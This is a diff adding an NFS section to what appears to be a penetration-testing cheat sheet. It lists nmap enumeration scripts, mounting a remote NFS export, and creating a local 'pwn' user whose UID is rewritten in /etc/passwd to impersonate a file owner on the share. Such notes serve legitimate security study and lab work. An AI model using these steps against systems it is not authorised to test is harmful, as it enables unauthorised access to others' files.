@@ -330,6 +330,36 @@ LIST
 RETR {List #}
 
 ```
+<br />
+
+## NFS [111] 
+
+<br />
+
+```bash
+
+# RPC info
+nmap -sV -p 111 --script=rpcinfo {IP ADDRESS}
+
+# List NFS vuln
+ ls -1 /usr/share/nmap/scripts/nfs*
+ 
+/usr/share/nmap/scripts/nfs-ls.nse
+/usr/share/nmap/scripts/nfs-showmount.nse
+/usr/share/nmap/scripts/nfs-statfs.nse
+
+# Run all vuln scripts
+nmap -p 111 --script nfs* {IP ADDRESS}
+
+# Mount remote directory
+sudo mount -o nolock {IP ADDRESS}:/{REMOTE DIR} ~/{LOCAL DIR}/
+
+# Add new user locally and change UUID
+sudo adduser pwn
+sudo sed -i -e 's/{CURRENT UUID}/{NEW UUID}/g' /etc/passwd
+
+```
+<br />
 
 ## SNMP [161] 
 
